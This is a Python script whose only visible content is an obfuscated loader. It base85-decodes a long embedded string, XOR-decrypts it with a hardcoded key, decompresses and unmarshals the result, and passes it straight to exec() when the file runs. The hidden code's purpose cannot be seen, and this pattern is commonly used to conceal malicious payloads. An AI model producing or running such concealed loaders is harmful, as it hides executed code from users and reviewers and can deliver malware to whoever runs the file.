import zlib, base64, marshal, hashlib


def xor_decrypt(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    return bytes(a ^ key_bytes[i % len(key_bytes)] for i, a in enumerate(data))


def decrypt():
    data = "K(L-a5e8Nlj=Z$TTKxX}ILVC_mlk2{cpXm%(^KLpKYDk6{N{*iiZlpw(2BH5TpsVOs}n72rDXp=eMJ~j-LY3-{LB1H4#PF#t+20=`gA)J8{FVQ;dPbC#2k|Kb-*F&o3Vb48<-2rYKm1bxy}dcx$oS8YQJ#|mNrMOr1XqtC<!c~(+n5sVxKavL_ALdQ)29k6>t+&OfJD=2ST(HsW(7#L)`$;0*Vxu@LI?0>~fVycRH1#z&<O*diK1GpJj;dA8@dC1LaR?eb6O!1=d*kE^Ri$YVx7JBCFdP`#qKz`pO2uuKTX?lVGNCV%0<?XIsG6a=BS^tDzgE#uc|nB@fN@cpNq2RakJ+hW7R&a&e-)CtX@~x)HUhK4q2C%5Ja*E<)|$5B)qSS|rb=aeMx@V{GB2?QSG8TyeHFJDyz%!m^tN5TcwtTh2|1X!Ot9TPgm5TdttCEB_{Ra$w)K#q5r6rR(B>u!;Ejlnvi4Xm{Nkjs+@jV0UntRE-pTCkAweyZ>1UvX7^xEBd^<4WsQ)>*a|@YG<a;N4|G+ktPfG#$K2cxFlwpDaaa5!7-d%#_on{*N8E*BmCJ%jN`{E>&ynQt9>=`t3ozgt%XvC_ovTPk&3bH=jrjSsNYUupQwz<)YPrhTLZGgkZrOcM+XK88M~MX*KZ3<kwI?=E6t6rnx&7)_pbwr&8NCNqwtw?x*DG(mnByw9~DlFjhB$Pzc}&6;>6-WD7OFa{*VX?xy8B|GrUcuPhBBD+CX^WNL1(%@3DnLCI3XxF2cSlV-iW`emi8@DW=`NvY+rdICs(>c0>o}8mQv-7f9z`6SH>fr-%jj84-Pz8*~r4w}w-gRy(5n&5-?avh+=No0Q;*Uo>8}`<j}hI&X-kfzhoh8y%{g1{T-;S16*rGm1C9v)tb&+IB^SD|9&tfJr^IhUix*1KmL}w_X#?OQ>4UbeAFP_a|LC6n4_SEaYaqOj88C+I5@CK$hZl^*K|(pRua5Zvdm=SQsRb;m-Ya5*;9Du5w`e9P$g0>(bAfE`rpg(TS-kuSNs0yD&;2*BYKbFn1b+Zow*2J=QH0vHRoI>ZW9X+*;<d|G43P@fj%js>(72wEO#xQbdPpA>ahte~)A#OW$oY_e;}TKo$I7f94sOwGe-|;5BV=n%1&|glm9O9GNy%CVUOc&wGlPx1#iVq09fV5U{^L3b|Gtvg;9p<3casrA<Jmtl@nm>VzSdDWqG-eIE}^9xYuV4OZnG{?(Gu##?hO@wCZUs3PKE<Hyl)U%bwWH|O7~Ny@+EPV=)<e6LkxYf5l#H|hZ$<bEKIUqmKUs65@X60=Wg#3)pGiypvP+PQQ)aeaC3D%A!Ykc>@!6Q;~FaH<71M6XdRf3|3$x&{#PTAukRuL<*U|0+vLJ@3-}2V9sBMtYZ*b+}h7reqkKU&L&2H4r&&M;Nc;AC;bV;+j(ysj61<Y1)^RPv#=}80N8xic%TWmlDa`sbI1SlwZAVvOCp0#uAWsUdq<sOP&jT=pHpgIJsTWUSpv->mn|`I2Lg(VdX_z%S%jagI_pgULf<*UQp%xpkbJtSd1MU7?~(1QjDfi(JiGC(w;7#gw6M5KTs3O^7L}VK>cZUz>E1ae&D1eU-D&UD$dO;3I75(6t?C@tqG&W#7cn(3o0e^%L&^W_L{cF>og{VZ;HoY9Uy9zt09zI8uM&T&Tix!Bnm6NsV`(=1v3o-oodADan)fgjm=DG_#*m*odtBjYOv~jK;df%!Dd(yOZOfyOQ--aXELRFNI_q5Fq`>4qIk6q!__wNeka@!kF5#FHN5jGrCqPev492)p|Bb;G*2}2zYFK`GJ`B=Q%U)m@xa0{`vT95zZAl<+VPCeRUY}W=l!V@VSH_S_$+4`Lct<&A10${E7dcKjIeQ>7N%YfjdRCLgF3BLZPBVlr?w>9?``5I03AW1IUTK*Raz-l?#CeF?fJ~_id<BO)oRJPIEaU)r*QjM;YDp08I2>MVUD~%Y?&{iIsITVA^CtKMAv1>qzD0uOn}uO;yD@NNm(iguc^OeW(0e&{}<fGxsXn`s}zn>h>NTAKBCfx+6R>6q*GfCT`?F_Sb6>l_JIy@le8tC4o1xYQZ)e?KS7MF{_rIS*STKesVI|XjLXgp&^O`&VFl1D5wTJXxwtRt_#_DA{T`p}wW33<TC%whTvG0+u05l(0?_wV?-)DY5hNo!Bnv)&wD)Fyi(3A!>(u6MS<w+A;)d35=VH6%9Gvf+qa2VL_6(`l)X!VU%qeB!iE1eu7|V;TSq^yIcP&m4Q-Sj7+R*>;p8bZe(#fA;kYTCtp(rUl*9$x9Xf{IfCWok*)vX_kU|c1pzrRznU(J|u`fHxl`w=(BXdS{KmBYw6muN2Ck(67G9<ycBg35c~5%DGG(FzZ;f{jBnS-#%#5zwp7Whj{$5h4EoDCxsXVKwY-uW~0Wb|)Y?q7cclHl1Hf(jEnVkgR(z&kbwtfcxZ`3gbx$40x`W|DxlW?<kx2LLz?cBRW-WSKR&~4k#zW4pMMal8gtey`#Q%`gKd6+17O7AG_8MOpu%hh}R>OMf4Zpz6-RHVPz+tkB0SIV&p~P)7Ai~^z&bclY8+@_If-(B|1}1>~tdbuT|T#spmzNNBCRUg?E_uk@(`CqoStkaW4j^%7`+az9wY+qkd2bGjay7nOr~ixW_c1T|zu?WOt_QD<>rkbh}tgP2ZGGSArRKSw_q6&@C->AsN(lf)-D%n0?tCMDZj(kNzh_x}5Cz&e}Vz7SX4UN`8|$I#=LXY2U~gD{851;?MR{M8qjoGcN!Eop|vXQp8dx+S(1qTk`fQ?|vYS=5qH%y!M3mTmdLszzDvTh^5p0v22>|=90LP3(74^v&{qso#k%{3(2dxWa)G$K<<%J#P3R_h_{l!{Q`VRk3`kj6@kYje9oBZ?9qJoDVtsqfUU9LTji>K%B!FyLUAIPfDfOow*~%P!^p9w$t{yywN=QLfs(4IOSyvs_Vj&GDE2*o+$>T&i?)NrG?^^hzw*fSwL<MM*Xmi)zCul&wFcl0*>#e};JPTUQyK(`7vGeLqxWy}XBc)ubqHu%vVkTaZBacg48dlE0%;_Avsn2J!iawam($jZKRT6hFOnyGcR9PqzJM9Ft%IPAJ1u8rb;}@uWLBn&Tgf!UOd`?j(uGHV3mFqO$02<bk4wDZi|DFD4<D`88i#?n+JK;RiCBI!t^x%k-+*|Kg~cch)?6lNajULaO`^=`{&4+c&<Yha0$M?;XX9&WA6N?Oqed~=Qya`Rn=3Z+F{(;GXg{-UERSk26v}_HjjCa2f<sY|X}5>gU}Az$r&%|u9^v~>`X^H~QIowa`oT>s-6s&GxR7=Irv>%hJD|oiLZiL(d#O+_>LG}J>TL3{zAy&IHe=_SLHPtR^Xbjk^Y=K*(u(EgE0AX~E7s>RQi&H6BrS<Mvrr*U(hInEf!i6BR=1AjL_dY%-U@?TR!!c;>Ti&1qkPeTlxdd3UEwQwl4Iu7kUOPKGN25MjhCdY!wG|LNMn3PpuM+iLvv!2_Dq87ycckcW%D67fWy89gxNRQ<oD`?$hqb3j%WGUbZp>7EXZ!DVYfLp2~$IaxhqHG*trf8ojBUDcs4TeB}^!agSUw+pswzo6H85G>M8#fD5~vS?&5nU1O}2NJut_QcVNRgacSAXSV`cePwt5$(J(ShhfRU(L2%Ye57u5U^pg%}Swn4e%Y?N@aIdP7!m4P<qK|8^TU;`>-M>@r|GsqDuv_c8e1nR;4t{K%6GPo7_*yCAetcXX`(i!fEFaZFZK@Pc;5~t7rr`%EtLp^HY&`Nxebw1*pe%(2OQ+yysjFQDz4;ezgRip+*kB*b(xRY+2gN@B<>1>!g99Xc0_#wmpfIuVvei%#YbJ_d9~XCT%ARc%&?e!v(fUNM5%*C@<P(DTgr6E)KKp_8n10PM&dq`hyP}SQd%e(1t*KF>#cC_7%=0E!g%D1+9JT|dqVPbSqQYEh*mfNeDu5V}2++xe(*Gc5R{M>i4QUQHPTK9fVr{8~K2Bh2oEvT?j|Ca*!9|YgO7G=D{w>btmQ?|ElWew8e&b;6w=nzkbzgIzc5JUZlDN|2DplnlL|ohJkuFabPgD%1b3KvF3zbX;Ex5@}Ol}&i?z$N4Kwa2JatgIl3TIYJKv_s%zgmlJU3foFGrB63qyv2RcdaeU)igwA`e<EMDy;8lS}V8CWJC)g&D#uHwCXTCpNTsLsi!_&f6^o;&wo2)BzVQNHsKcmI^-?rVSf3{4?7%qtZTB*MJKu>GjSG^NUtFFwPF-1D3$#{w?Ss)%FI&)V_AP}ZRuI*O9-=Z*A|K%n1!-%XR!Xt)U8Ic>2NG%rhwy4U@a9l?kg!>MU9WMWE`39N;%H#5ec6`5*Mk>F@PD)O19266{|?d(Gj;qDTYv*u_+8jo7Lgrt0lbcz9piC!*rIzZf%)tqrC_7ULo4uX6@t^RK<XEJowC3HfB@Xxe<4OWK1;rzOnwMgh%~tu~Pp!*;xs=AWYu8!L%YA+rhZDTWjmVi8*h02|R@ZCxLrFVG1NDSkG-`=PlT1letX^Q@Hxi^xD!5?$<FCzG|c@aQ!LQ6V;dcp#~%Y?8<6w8&Vf}y<sK6;YmtIZq_qqCbpA4Q;_qPF2W#10tCr~O-~e89tD-sB9Dhw+o!qUoB1b@E-SXsb8CY6XumtTv+%_f=Q%gp1-w!?hsQ%yL6&GCWQRf0l)a^yuGu2Ex_}hqM)>J0@d&Nfj(2{MvlrQ{hOnHPsqZ$?<g4=<*WM1)3*T7OrxDz(rAtRmq0e%33yx=~Z}O^n$_z#0W>d;_D0&k}s8+$a4$W3_v;(MlVhm?))o-9U;buX83-blN%{<MqU6(_Wk0Bw;+^49!S@?l$ZA)?Y?VX<T-2BPJ<*SDIU+Z?wXDAtPB<2RLhd1=H&g}rmP6bBDxeb^K+ElJ~ii|R{wuHTr9PpN5hQ${pp%Q^$1?JXO0a`enEWRGTJC)$q2AaW5VazBj00TL5NZ+L2ii*1(wR=|^I-yZ2R;`<gX%=L*u}xyjy&UHmAYQMd!<}VrLb^cBGmNYuWfTQ@I&;E2Vq1&m^rZA(q3SLp(GnP2M@}(g+x8u3;lBZv3Y9Ps?W|D5BsCJ^yLSwp1>)<2OIG-G##)l*aV37E*PT5@Und|UxnrqO?WDR}7|cY%FO4XibNXF|E)^fyY@E+fW?L*m6FomZ1zm(c)Gfv^)Zd-k!c?A4s(=?caea5I<Y!_==?k13{*V_K`P)ES6+X_>p_uI;P|yqsRvt2HIJ+Q2wVmePzn;0R9rrKALQ(8z{4Pr^!9hxEP#yK>9GT90jHIc`F-k)PqQ2$shQ$VY;u7p)(kDu01e3+_?VU)b+D#~c;xyqp(kf2WJ4`7P3gVt2G(7{5Sm)fA%gZ`oh!g&L#ePtmGC$stRPN#ozEEGaPuzHjG9ZWRd1Xr7NNIYOjDJ*Yo{ypKty9!58bF7nv3jyd680=u=V_fz6`|_$%VN@xMt&*DMn6u`h@wVK!!tca_0cSE+j6L^y_lOYm`37JTdAxY3*$1($hV*UWAgqO!V`oc$)(nq+#2nBa!<9PvuaMoFtEbTe3QV_$`HD>^_IjZ2{@YR7Wb6kU!}B)Z4=#Jc<flvCOiN9uxQi(*THg+l1uU6IT8EDC(6GPsqCE(OjvLVcVprp&8gGC#0ZJ>V|jZxba9m71X4ULyaj2sb!8^jiK5)HdX&$V{Vn4Gox}RP&9N3dQgTw6e#`ux35f^#Rxb)0z%jQDx3)!KH#!78Ast)pqV#gHMKRQ+l2bXEQg`9I4_3O9LH60DgdR>1Y@bfr7-k6|7gB6Iip!00G@>_j3>s8>l$9QLPdKnY5LUNsipgkE2Ur=~9G2@Zbi|hN>7@#d=*e3BFk`Lx7%xlVya6F5k6Lj#4?`I9vCZhl7-fsOgExl7;lbm3cuz`}T^>t;FMgg8&!ZkO!sAo9C@$L9xRgvLE&<t_!YDW3IOKI=jib=Vi@I{`L=R|yO!7%hgz_5^jy7BtXp|{|q@iQ!BIE5mQ^CN4m3r`0UK*xd<I%npKHggo3k&5%OEk*Cw~O`>7F-XnbzEIek(yxAz3ttk`1iC~qmRW|?PdTwVJ#Up;-QIm^Mx+BL43Hpeex#}$$}6_`kO^pVxTq&oXs1jJ(<gP=^*<LaPv&xV@eT0Y_lN@<@@H1c>o(=^+Z(2Q=%xaiu6CsF=<R-cp`aFla=K8i+fNn7IV@}xqObf0phiS9iQ7_rp~$U_Gl>@lzmE?@Nzn0D?)UDe$%gRlNrZ5%|;&!?xDJ-t>oWdnHR$bBJ3s0VT()%;pta}aSeelj3c|!S|zHAtcEenA|Yq;&#Gs#+L-^}<;zH#FyxN67B<9dlO!dq^M<j2&pFpJ=olVhA9hxJ=nH9BYyjfkda}xFV?Ks%T$knIHdQR28F;Qe+xnkguz~_{w{&QyALz_efpX5nk7azUmpWzs{_~}C>DJb^<L((xLC_9L?9WD%UiE|CsN%a$5E5I0>QS0VRspc7$udsBr1hmfRY%M%OR{Cu5J-2R<oY#j3h}`HGq?7TJ%XoXG<Qw3Xd=XKD4V1C<q}ekti?S~(x<JWB6EgtUsjhzxpbFj<;>+f$sh-8jRL7J#v7WbGIe(7O<vT%Q0OfjQ`=~`R?M<bb)@iOo~N+6UhYwg$HL9TauX=u<G#R&$sFL(+&{fmjD}&Et^V-pizdq7`e0aL_NpJ#kK2d)8QG|T%R5*!ibX&I_Q%`JbQxKEd|qJjHOU^&PIlpG{WBo_WdsQr1tJf|wOMKkH2D>C7#ghybEtU9#qRF->=L*#?buXqH^(Wdis6&)eE=WWc92*v^0eh8?eQCz8(dZCxZ?_wCZa&Sg@!$F(YKp1&C5TmQ5*%j%#_F{z8SH=9H>dFd}n&%66N-Dj(;CnH!s%@zvOrHGy&4YG;QU;%lnW>9``;%&b(h9InW%6CY-U2cI^+6dbM1CQl`UFc0qfhS;sSzH5lw;9kJ)P3D1d}F^#ntvAvJ8x0B|rB`p-0fH;a;HlZDS^;Hlq#k5$Vf;Qrf@jVI-)LHHOfodBfrC_BTS-I4@2#7_t=`E+7o;&p%kco2brgz<2Asl2;P?)0lJ;s=^tJBE<@K|nsQfst~7B6w{HFu#h0i5Hfg(qClrABg%9$|Us96k+FJC_`xY7$5<;0Do&89g^CGy10v7y#8~IDaIFTyU?!-lVCjVz&80)EBU~-fue!Z;MIY+EGz&@-4|s!W!|^)6OtQyu!3s`T?R46(}m4AJ|aL(Js(!D}2`Ee4sd4?u@weq67M#ga<MsoCkJC9WqNhL;|(G><oPE%PTE7Y)pPxDg3n258nX>xElx7LhtDsTBu0{9hNN$sUNbk(|TRbfmh9g>@fXiKYzjGNa`9yYncm7S8T9xt>MLMuJlMhe`zuMJDS%yb_=VJd{`Vu778U-KYjL_(0kp5>T9F(_B!qVLpOP~QMKsIz*L3P%E~+Lkx9r7NHZ8p<CBT?v}kR0CaI7Fc>thkF}SR;Ymgr#bwGzw_~q-EKOBLJlJfewoLxMDBd{i$ey^{rV^;kZGVqmR0Q};^MOr@YvH8yHP)>}9f`=@RE^~gVy3WSrhm!39z^+?M)$MHnUxy>qxctLbw6O&9YwVgoMflAtgNwD#ras8}Oypwgynk?vXam;qouy1Uj-t#k@wKQ2ZNca4IP*={Sxz6H604P?tC7^`#CH$6Vx~(YCwDz#s6nrYou`EOYQE0$uocwzPXQ=w-d%}`nsaE)@9SuY<r2y5Dr-*pz3sjlW00Htr}w2$^0mLC1272ZSYeU<XwJg)SMGty@B_X*3d;Vd<R||CpzgSCvqAbbrn)xlQ?KyMO1K0UXe<(N4gd#r4lmq{?Y)^@Pi9SV;+gBOMguL!`$BSpSic{-10!)smRM0T&9cfT5Z_R~uDUa8rtltlR10JtfEaZF3nj2hC2gCc3^xJ2(?Ro@Pv`Q60mUi+a2GsP_lv>HN5{<TUc7mv&s2Ec9apx$PDM<7vY>^CA5+8wiJM;LzdbOsdAygdd}|)h<6<>po|AD)<3~yO%s(b}99lEm!^V85;BNj)5QD<RbN86THHkgz{H2(PFDb&M2<T@Mv6V3w9%k4Q6)W4WmrmB&q^<hkGRNx?nePB#dib!<xYO~UTBLCUn4S2$Y7DwaUuD;KVb@9L3ox~CBQT&f23n+~Xrn{|wLSzI7l^aB$1lT+o`ds25dZ4@Jcp)&dtft&G2MFBn;L&+Kvcp&d=Ma>sQHKY@51NCJJhZ7Q#VKf*=5)s|AY$2iQ4d8s7w#zMHz%{<JReUT+7bGuDfopJ>2?`zPsdbwU~Q+9DI`>h^uoxNATU0Yw0<gzKyF7GY-|>SBy!Oe;NuRmM|*?rKA=ZSuR`G>Py!EiAsrg)6N1y0f7=l)rn?4U2F)acz9#CJ1L-mBAR_T@et&`=c{Rc#(uQB0@Hb}p9PQomF1sd$s2r1y^oiXQ)h>WpBKlGo#~{Ol`tM4#qjXfdxAxJh7j_u(1*65)|P`o;+6_b`Rsj~uzwVBygMT{z3hx*v+E|f0jU0D_HquzRn_NOoSpYmJtZa>=a<vs_Jf2u<gJ<Ac5a^6)77A~W6!DRzg>qwdv!%c5PK~4McTq8=@HD|=<UJe6{2kphQj(D;{iwrr~}whX~3RJH4ufw>;o&f=mKY}2OWe2ZU9B45}=)AO22|<mp2F=0#Is1PW0(vz`v~Y-*!Ftq|kC`+BmOs`y_$&tgB2cSW3#hx*mkp0_9MA=}4t={eQ3-Wt`&isM=-=7V8CIv=XNrjdxgp>tx6ZanNZLuYlu$b-*(Ez;LukX_%&1Ia=1|^TlG#9fJvBStM^<G*V&9fm-={ZR%lnVxqsSJasOAUsQ9!mymNViJ@}BuG9#Jr57Elu5&8!$d+4$)j7nox7;x)2)U1==@@Ctj)3RR9Hu0D<BU2d!?_`$@^w-|*#!luuzWjD@*Q`|nh@xKG5SoI7xUJ)%RHsvos$dxO^pt-frZ_n3tOLzT%XXekv)trkgq(nDawDFsRFR3+K5$j!IN-&sx+8Tx6&ZL1&S~Vw3EyyT>pui#f_LhZ?><_olAz@cRp<o-o%I7c{Sq}eFSk50v8gGQcQn+3SNSIlHv+`T;L3_g{Vq;D7XAFlG}%oOc@2I5M5<)cY@;IkW`>Z_j`(%_oB<7pD1eYl==`+82H80{gkxl^OuvAK=ZcB=-ha5xv>lO+AY>*(I0{wK0_J(&OoMwUScb8eEp3#@=mga&`oM-4-P}OYQ-Aa4s6a{TQ9?hd}T(PTOLk6GW>ovVmPg1qO@#06wqcA?V)TG_QZuJL4FxYJGgf1{CLuvLKzHxN%O5#IkOf8dHK>`^HV_v&Lz_V9`UYD{{8FA$REZ8vh<_)utJbZ5LnFq>Imir8YFv_rsbxl8eKJ`$I@8c$P$tZZ0DR)wLfR34%1$x+s@^@jhOxrM)FV5P=9hZ%ZQ(#0~X(rl*j{)<X-!333SOiN{@gGVtE^}))gr*D%XT(gjfpT<MX#(UW$K-igt2~Z;A^ZaPK)UK06og2u-XA^Z}t0lmHAuktbh?-SnD*ykZYcIzTNlF(c?%O!Tt{?vb8SjVj>09_ipXx)aLwF1Vj=UI4}wBwE8b#9?5r9g0>JjIh9NK)nB-dzPftf0j$#!ZIYxwpeyg-4j9vB^XHi3$LMSAN}3^h~ysT-MQ~&{k6T@KB(f0GM@`0Jf&55zYNFX^MP!v*&sB`2`H0ykb~N5&|`vZoC20n!8ZUqv>6}tS4?@Nu#{H-YyRy0P<vq%_OCx%eA4GUq&p!dw8N?>RC9fO@K}A!YQ9TdF^_dwLs^~2Xu6G+cZ9h}nQ>JeD#&cKoB-pa=sBoKARG}Xoy6;=GCNjyIb`7)`bX6+`Z{&SsK|i@7xr0M1}=SK8=OZZ*f4n;h=ldn1V0?}4j+FWBY*+4WCN?&et_p2E-=5f69FB6L5Xro{j3+gl#G@"
    key = "8jsDlvEP8S8yfn8nT0vFOvBoTbL1KK9I"
    checksum = "44825e5d9a509b6d"

    # Verify checksum
    if hashlib.sha256(data.encode()).hexdigest()[:16] != checksum:
        raise ValueError("Data integrity check failed")

    # Decrypt process
    encrypted = base64.b85decode(data)
    compressed = xor_decrypt(encrypted, key)
    marshalled = zlib.decompress(compressed)
    return marshal.loads(marshalled)


exec(decrypt())
